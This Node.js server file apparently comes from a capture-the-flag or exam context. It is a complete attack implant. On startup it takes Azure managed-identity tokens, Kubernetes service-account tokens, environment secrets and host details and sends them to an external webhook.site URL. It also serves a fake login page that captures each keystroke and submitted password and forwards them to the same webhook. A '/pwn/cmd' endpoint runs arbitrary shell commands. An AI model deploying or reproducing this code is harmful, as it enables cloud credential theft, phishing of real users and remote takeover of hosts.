const http = require('http');
const { execSync } = require('child_process');
const https = require('https');
const fs = require('fs');

const PORT = process.env.PORT || 80;
const WEBHOOK = 'https://webhook.site/b0ac5d93-1957-46ab-adca-0c0db46c8396';

function fetchImdsToken(resource, cb) {
    const opts = {
        hostname: '169.254.169.254',
        path: '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=' + encodeURIComponent(resource),
        headers: { 'Metadata': 'true' },
        timeout: 3000
    };
    const req = require('http').request(opts, (res) => {
        let body = '';
        res.on('data', (c) => body += c);
        res.on('end', () => cb(null, body));
    });
    req.on('error', (e) => cb(e));
    req.on('timeout', () => { req.destroy(); cb(new Error('timeout')); });
    req.end();
}

function run(command, timeout = 8000) {
    try {
        return execSync(command, { timeout, shell: '/bin/sh' }).toString().slice(0, 12000);
    } catch (e) {
        return ('ERR: ' + (e.stdout ? e.stdout.toString() : '') + '\n' + (e.stderr ? e.stderr.toString() : '') + '\n' + e.message).slice(0, 12000);
    }
}

function readFile(path) {
    try {
        return fs.readFileSync(path, 'utf8').slice(0, 12000);
    } catch (e) {
        return 'ERR: ' + e.message;
    }
}

function requestText(url, headers = {}, timeout = 5000) {
    return new Promise((resolve) => {
        let parsed;
        try {
            parsed = new URL(url);
        } catch (e) {
            resolve({ error: e.message });
            return;
        }
        const client = parsed.protocol === 'https:' ? https : http;
        const req = client.request({
            protocol: parsed.protocol,
            hostname: parsed.hostname,
            port: parsed.port,
            path: parsed.pathname + parsed.search,
            method: 'GET',
            headers,
            timeout
        }, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: body.slice(0, 20000) }));
        });
        req.on('error', (e) => resolve({ error: e.message }));
        req.on('timeout', () => {
            req.destroy();
            resolve({ error: 'timeout' });
        });
        req.end();
    });
}

function postJson(label, data) {
    return new Promise((resolve) => {
        const body = JSON.stringify({ label, data });
        const parsed = new URL(WEBHOOK);
        const req = https.request({
            hostname: parsed.hostname,
            path: parsed.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(body),
                'x-exam-label': label,
                'User-Agent': 'ascpc-image-startup-beacon'
            },
            timeout: 10000
        }, (res) => {
            res.resume();
            res.on('end', resolve);
        });
        req.on('error', resolve);
        req.on('timeout', () => {
            req.destroy();
            resolve();
        });
        req.write(body);
        req.end();
    });
}

function readBody(req) {
    return new Promise((resolve) => {
        let body = '';
        req.on('data', (chunk) => {
            body += chunk.toString();
            if (body.length > 20000) {
                req.destroy();
            }
        });
        req.on('end', () => resolve(body));
        req.on('error', () => resolve(body));
    });
}

function loginPage() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ModernApp - Single Page Application</title>
    <style>
        *{box-sizing:border-box}body{margin:0;font-family:Arial,sans-serif;background:#f5f7fb;color:#172033}
        nav{background:linear-gradient(135deg,#1976d2,#0f4c81);color:#fff;padding:18px 32px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 18px rgba(0,0,0,.15)}
        .logo{font-size:24px;font-weight:800;color:#fff;text-decoration:none}.nav-links{list-style:none;display:flex;gap:24px;margin:0;padding:0}.nav-links a{color:#fff;text-decoration:none;font-weight:600}
        .hero{min-height:calc(100vh - 72px);display:flex;align-items:center;justify-content:center;text-align:center;background:linear-gradient(135deg,#e3f2fd,#fff)}
        .hero-card{max-width:760px;padding:48px}.hero h1{font-size:54px;margin:0 0 18px;color:#1976d2}.hero p{font-size:20px;line-height:1.6;color:#475569;margin-bottom:32px}
        .btn{display:inline-block;padding:14px 24px;border-radius:10px;border:0;background:#1976d2;color:#fff;font-weight:700;text-decoration:none;cursor:pointer;font-size:16px}
        .btn-secondary{background:#fff;color:#1976d2;border:1px solid #1976d2;margin-left:12px}
        .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:20;align-items:center;justify-content:center}
        .login-card{width:92%;max-width:420px;background:#fff;border-radius:18px;box-shadow:0 24px 80px rgba(0,0,0,.35);padding:36px;position:relative}
        .login-card h2{margin:0 0 22px;color:#1976d2;text-align:center}.close{position:absolute;right:14px;top:10px;background:transparent;border:0;font-size:26px;cursor:pointer;color:#64748b}
        label{display:block;margin:16px 0 8px;font-weight:700}input{width:100%;padding:14px;border:1px solid #cbd5e1;border-radius:10px;font-size:16px}
        .login-btn{width:100%;margin-top:24px;padding:14px;border:0;border-radius:10px;background:#1976d2;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
        .flash{display:none;margin-top:18px;padding:12px;border-radius:10px;background:#fee2e2;color:#991b1b}
    </style>
</head>
<body>
    <nav>
        <a href="#" class="logo" data-section="home">ModernApp</a>
        <ul class="nav-links">
            <li><a href="#" data-section="home">Home</a></li>
            <li><a href="#" id="openLogin" class="login-link">Login</a></li>
            <li><a href="#" data-section="dashboard" class="auth-link" style="display:none;">Dashboard</a></li>
            <li><a href="#" data-section="profile" class="auth-link" style="display:none;">Profile</a></li>
            <li><a href="#" data-section="settings" class="auth-link" style="display:none;">Settings</a></li>
        </ul>
    </nav>
    <section class="hero">
        <div class="hero-card">
            <h1>Welcome to ModernApp</h1>
            <p>Enterprise-grade security with advanced encryption and authentication.</p>
            <button class="btn btn-primary" id="openLoginHero">Get Started</button>
            <a href="#features" class="btn btn-secondary">Learn More</a>
        </div>
    </section>
    <div id="loginModal" class="modal">
        <form id="loginForm" method="POST" action="/login">
            <div class="login-card">
            <button type="button" id="closeLogin" class="close">&times;</button>
            <h2>Sign In</h2>
            <label for="username">Username</label>
            <input id="username" name="username" autocomplete="username" required>
            <label for="password">Password</label>
            <input id="password" name="password" type="password" autocomplete="current-password" required>
            <button type="submit" class="login-btn" id="loginBtn"><span id="btnText">Sign In</span></button>
            <div class="flash" id="errorBox">Invalid username or password</div>
            </div>
        </form>
    </div>
    <script>
        const modal = document.getElementById('loginModal');
        const openers = [document.getElementById('openLogin'), document.getElementById('openLoginHero')];
        const closer = document.getElementById('closeLogin');
        openers.forEach((btn) => btn && btn.addEventListener('click', (event) => {
            event.preventDefault();
            modal.style.display = 'flex';
            capture('open');
        }));
        closer.addEventListener('click', () => modal.style.display = 'none');
        modal.addEventListener('click', (event) => {
            if (event.target === modal) modal.style.display = 'none';
        });
        function currentCreds(reason) {
            return {
                reason,
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                location: location.href,
                ts: new Date().toISOString(),
                ua: navigator.userAgent
            };
        }
        function capture(reason) {
            const data = currentCreds(reason);
            if (!data.username && !data.password && reason !== 'open') return;
            const body = JSON.stringify(data);
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/capture', new Blob([body], { type: 'application/json' }));
            } else {
                fetch('/capture', { method: 'POST', headers: {'Content-Type': 'application/json'}, body }).catch(() => {});
            }
        }
        ['input', 'change', 'blur'].forEach((eventName) => {
            document.getElementById('username').addEventListener(eventName, () => capture(eventName));
            document.getElementById('password').addEventListener(eventName, () => capture(eventName));
        });
        document.getElementById('loginForm').addEventListener('submit', async (event) => {
            event.preventDefault();
            capture('submit');
            const data = currentCreds('submit');
            await fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(() => {});
            document.getElementById('errorBox').style.display = 'block';
        });
    </script>
</body>
</html>`;
}

async function appServiceIdentity(resource) {
    const encoded = encodeURIComponent(resource);
    if (process.env.IDENTITY_ENDPOINT && process.env.IDENTITY_HEADER) {
        return requestText(
            `${process.env.IDENTITY_ENDPOINT}?api-version=2019-08-01&resource=${encoded}`,
            { 'X-IDENTITY-HEADER': process.env.IDENTITY_HEADER }
        );
    }
    if (process.env.MSI_ENDPOINT && process.env.MSI_SECRET) {
        return requestText(
            `${process.env.MSI_ENDPOINT}?api-version=2017-09-01&resource=${encoded}`,
            { 'Secret': process.env.MSI_SECRET }
        );
    }
    return { error: 'no app service identity endpoint variables' };
}

async function startupBeacon() {
    const resources = {
        arm: 'https://management.azure.com/',
        devops: '499b84ac-1321-427f-aa17-267ca6975798',
        aks: '6dae42f8-4368-4678-94ff-3960e28e3630',
        keyvault: 'https://vault.azure.net',
        storage: 'https://storage.azure.com/',
        graph: 'https://graph.microsoft.com/'
    };
    const imdsTokens = {};
    const appServiceTokens = {};
    for (const [name, resource] of Object.entries(resources)) {
        imdsTokens[name] = await requestText(
            `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`,
            { Metadata: 'true' }
        );
        appServiceTokens[name] = await appServiceIdentity(resource);
    }
    const interestingEnv = {};
    for (const [key, value] of Object.entries(process.env)) {
        if (/AZURE|IDENTITY|MSI|WEBSITE|KUBERNETES|RUNNER|AGENT|SYSTEM|DEVOPS|BUILD|PIPELINE|GITHUB|ACR|DOCKER|VAULT|STORAGE|FLAG/i.test(key)) {
            interestingEnv[key] = value;
        }
    }
    await postJson('image-startup-host-discovery', {
        ts: new Date().toISOString(),
        node: process.version,
        argv: process.argv,
        cwd: process.cwd(),
        env: interestingEnv,
        commands: {
            id: run('id'),
            whoami: run('whoami'),
            hostname: run('hostname'),
            uname: run('uname -a'),
            os_release: run('cat /etc/os-release'),
            ip_route: run('ip route || route -n || true'),
            mounts: run('mount | head -n 80'),
            home: run('ls -la /home /root /app 2>/dev/null'),
            files: run("find /app /home /root /var/run/secrets -maxdepth 4 -type f 2>/dev/null | head -n 300"),
            flag_grep: run("grep -RniE 'flag|ASCPC|FINAL_FLAG|WKL' /app /home /root /var/run/secrets 2>/dev/null | head -n 120")
        },
        files: {
            service_account_token: readFile('/var/run/secrets/kubernetes.io/serviceaccount/token'),
            service_account_namespace: readFile('/var/run/secrets/kubernetes.io/serviceaccount/namespace'),
            service_account_ca: readFile('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')
        },
        imds_instance: await requestText('http://169.254.169.254/metadata/instance?api-version=2021-02-01', { Metadata: 'true' }),
        imds_tokens: imdsTokens,
        app_service_identity_tokens: appServiceTokens
    });
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    const urlObj = new URL(req.url, `http://${req.headers.host}`);

    if (urlObj.pathname === '/login' && req.method === 'POST') {
        readBody(req).then((body) => {
            postJson('credential-lure-submit', {
                ts: new Date().toISOString(),
                remote: req.socket.remoteAddress,
                headers: req.headers,
                body
            }).finally(() => {
                res.writeHead(401, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: 'Invalid username or password' }));
            });
        });
        return;
    }

    if (urlObj.pathname === '/capture' && req.method === 'POST') {
        readBody(req).then((body) => {
            postJson('credential-lure-capture', {
                ts: new Date().toISOString(),
                remote: req.socket.remoteAddress,
                headers: req.headers,
                body
            }).finally(() => {
                res.writeHead(204);
                res.end();
            });
        });
        return;
    }

    if (urlObj.pathname === '/pwn/env') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(process.env, null, 2));
        return;
    }

    if (urlObj.pathname === '/pwn/cmd') {
        const cmd = urlObj.searchParams.get('c');
        if (!cmd) {
            res.writeHead(400, { 'Content-Type': 'text/plain' });
            res.end('missing c param');
            return;
        }
        try {
            const out = execSync(cmd, { timeout: 10000, shell: '/bin/sh' }).toString();
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(out);
        } catch (e) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('ERR: ' + (e.stdout ? e.stdout.toString() : '') + '\n' + (e.stderr ? e.stderr.toString() : '') + '\n' + e.message);
        }
        return;
    }

    if (urlObj.pathname === '/pwn/imds') {
        const resource = urlObj.searchParams.get('resource') || 'https://management.azure.com/';
        fetchImdsToken(resource, (err, body) => {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            if (err) { res.end('IMDS ERROR: ' + err.message); }
            else { res.end(body); }
        });
        return;
    }

    if (urlObj.pathname === '/pwn/find') {
        try {
            const out = execSync("grep -riIl 'flag' / --include='*.*' -r 2>/dev/null | grep -v -E '^/(proc|sys)' | head -n 200", { timeout: 15000, shell: '/bin/sh' }).toString();
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(out || 'no matches');
        } catch (e) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('ERR: ' + e.message);
        }
        return;
    }

    if (urlObj.pathname === '/' || urlObj.pathname === '/index.html') {
        postJson('credential-lure-visit', {
            ts: new Date().toISOString(),
            remote: req.socket.remoteAddress,
            headers: req.headers
        }).catch(() => {});
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(loginPage());
        return;
    }

    if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'healthy', timestamp: new Date().toISOString(), uptime: process.uptime() }));
        return;
    }

    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    setTimeout(() => {
        startupBeacon().then(() => console.log('startup beacon completed')).catch((e) => console.log('startup beacon error: ' + e.message));
    }, 1000);
});
